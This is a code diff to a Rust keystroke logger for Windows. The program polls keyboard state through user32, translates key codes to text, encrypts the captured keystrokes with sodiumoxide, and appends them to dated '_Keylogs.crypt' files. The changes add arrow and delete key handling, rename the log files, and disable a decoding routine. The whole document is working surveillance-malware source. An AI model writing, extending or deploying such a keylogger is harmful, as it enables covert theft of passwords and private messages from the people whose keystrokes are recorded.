@@ -1,6 +1,7 @@
 //extern crate winapi;
 extern crate user32;
 extern crate sodiumoxide;
+extern crate time;
 
 mod win_key_codes;
 
@@ -10,10 +11,10 @@ use sodiumoxide::crypto::secretbox;
 use std::io::Write;
 use std::collections::HashMap;
 
-
 fn main() {
     sodiumoxide::init();
-    decoder("./keys.log".to_string(), "./encryption_key.char".to_string());
+    //decoder("./keys.log".to_string(), "./encryption_key.char".to_string());
+
     let mut to_write_queue = String::new();
 
     let mut key_downed: HashMap<u8, bool> = HashMap::new();
@@ -48,6 +49,11 @@ fn main() {
                     VK_OEM_2 => "/".to_string(),
                     VK_ESCAPE => "[Esc]".to_string(),
                     VK_RETURN => "\n".to_string(),
+                    VK_LEFT => "[Left]".to_string(),
+                    VK_RIGHT => "[Right]".to_string(),
+                    VK_UP => "[Up]".to_string(),
+                    VK_DOWN => "[Down]".to_string(),
+                    VK_DELETE => "[Delete]".to_string(),
                     0xA0 ... 0xA5 | VK_SHIFT | VK_MENU | VK_CONTROL => "".to_string(),
                     _ => { "[Not Impl]".to_string() }
                 };
@@ -71,7 +77,7 @@ fn save_string_to_queue(to_write: &String, string_queue: &mut String) {
     string_queue.push_str(to_write);
 
     if string_queue.len() < 100 { return; }
-    let string_queue_owned = pad(string_queue, 144, '-',true);
+    let string_queue_owned = pad(string_queue, 144, '-', true);
 
     string_queue.clear();
 
@@ -79,17 +85,18 @@ fn save_string_to_queue(to_write: &String, string_queue: &mut String) {
 
     let encrypted = secretbox::seal(string_queue_owned.as_bytes(), &nonce, &key);
 
+    let now = time::now();
+
     let mut file = std::fs::OpenOptions::new()
         .write(true)
         .append(true)
         .create(true)
-        .open("./keys.log").expect("Failed to open file");
+        .open(format!("./{:05}-{:02}-{:02}_Keylogs.crypt", now.tm_year + 11900, now.tm_mon, now.tm_mday)).expect("Failed to open file");
 
     file.write([&nonce[..], encrypted.as_ref()].concat().as_ref()).expect("Can't write to file");
 }
 
-fn pad(original: &String, width: usize, pad_char: char,truncate: bool) -> String {
-
+fn pad(original: &String, width: usize, pad_char: char, truncate: bool) -> String {
     if width <= original.len() { if truncate { return original[..width].to_string(); } else { return original.to_string(); } }
     let diff = width - original.len();
     let mut s = original.clone();
